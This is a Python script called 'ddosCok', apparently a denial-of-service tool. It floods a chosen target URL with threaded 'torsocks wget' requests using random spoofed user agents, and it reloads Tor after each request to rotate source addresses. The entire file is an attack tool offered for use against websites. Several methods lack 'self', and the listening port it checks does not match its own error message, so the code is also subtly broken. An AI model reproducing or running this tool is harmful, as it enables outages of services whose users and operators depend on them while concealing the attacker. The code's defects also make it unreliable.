#! /usr/bin/python3
# EX: sudo python -t https://target.com -n 1000
# requirements: Tor/Torsocks, netstat, wget

from sys import exit
from os import popen
from threading import Thread, Lock
from argparse import ArgumentParser
from subprocess import call, Popen, PIPE
from random import randint


class ddosCok:
    def __init__(self, target_address, number):
        self.target_address = target_address
        self.number_requests = int(number)
        self.reload = 'service tor reload'
        self.wget = "torsocks wget -o /dev/null --spider --user-agent='%s' %s"
        self.lock = Lock()
        self.user_agents = self.set_user_agents()
    def whoami():
        who = ['whoami']
        return 'root' in Popen(who, stdout=PIPE).communicate()[0].decode()
    def check_listening():
        for line in popen('netstat -na --tcp'):
            if '127.0.0.1:3137' in line:
                return True
        return False
    def reload_tor(self):
        with self.lock:
            try:
                call(self.reload, shell=True)
            except Exception:
                pass
    def service_status(self):
        for line in popen('service --status-all'):
            yield line.split()
    def check_services(self):
        for i in self.service_status():
            if '+' in i and 'tor' in i:
                return True
        return False
    def check_config(self):
        if not self.whoami():
            error = "Please run ddosCok.py with root "
            print(error)
            exit(1)
        if not self.check_listening() or not self.check_services():
            error = 'Please the Tor service is started '
            error += 'and listening on socket 127.0.0.1:9050'
            print(error)
            exit(1)
    def get_agent(self):
        return self.user_agents[randint(0, len(self.user_agents) - 1)]
    def request(self):
        cmd = self.wget % (self.get_agent(), self.target_address)
        try:
            Popen(cmd, stdout=PIPE, shell=True)
        except Exception:
            pass
        finally:
            self.reload_tor()
    def run(self):
        for get in range(self.number_requests):
            t = Thread(target=self.request)
            t.start()
    def set_user_agents():
        return [
            "Opera/9.80 (S60; SymbOS; Opera Mobi/498; U; sv)",
            "Wget/1.11.4 (Red Hat modified)",
            "GSiteCrawler/v1.06 rev. 251 (http://gsitecrawler.com/)",
            "Mozilla/2.02 [fr] (WinNT; I)",
            "WeatherReport/1.2.2 CFNetwork/485.12.7 Darwin/10.4.0",
            "W3C_Validator/1.432.2.10",
            "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)",
            "Cyberdog/2.0 (Macintosh; 68k)",
            "MJ12bot/v1.0.8 (http://majestic12.co.uk/bot.php?+)",
            "Exabot/2.0",
            "TurnitinBot/1.5 (http://www.turnitin.com/robot/crawlerinfo.html)",
            "Jyxobot/1",
            "Mozilla/5.0 (compatible; news bot /2.1)",
            "admantx-sap/2.4 (+http://www.admantx.com/service-fetcher.html)",
            "curl/7.19.6 (i686-pc-cygwin)",
            "facebookexternalhit/1.1;line-poker/1.0",
            "ConveraCrawler/0.4",
            "Mozilla/4.0 (MSIE 6.0; Windows NT 5.1; Search)",
            "Yahoo Pipes 1.0",
            "EARTHCOM.info/1.6 [www.earthcom.info]",
            "librabot/1.0 (+http://search.msn.com/msnbot.htm)",
            "NetResearchServer/2.5(loopimprovements.com/robot.html)",
            "PHP/5.2.10",
            "msnbot-Products/1.0 (+http://search.msn.com/msnbot.htm)",
            "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)",
            "Wget/1.12 (linux-gnu)",
            "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.3 (KHTML, like Gecko) BlackHawk/1.0.195.0 Chrome/127.0.0.1 Safari 62439616.534",
            "Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
            "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
            "Mozilla/5.0 (PlayStation 4 1.52) AppleWebKit/536.26 (KHTML, like Gecko)",
            "Mozilla/5.0 (Windows NT 6.1; rv:26.0) Gecko/20100101 Firefox/26.0 IceDragon/26.0.0.2",
            "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)",
            "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)",
            "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)",
            "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)",
            "Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)",
            "Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)"
        ]
if __name__ == '__main__':
    ex = 'Usage: python ddosCok.py -t <target URL or IP> '
    ex += '-n <number of requests to make on target>'
    parser = ArgumentParser(description=ex)
    h = ('target URL or IP', 'number of requests')
    parser.add_argument('-t', '--target', required=True, help=h[0])
    parser.add_argument('-n', '--number', required=True, help=h[1])
    args_in = parser.parse_args()
    print('running...')
    doss = ddosCok(args_in.target, args_in.number)
    doss.check_config()
    doss.run()
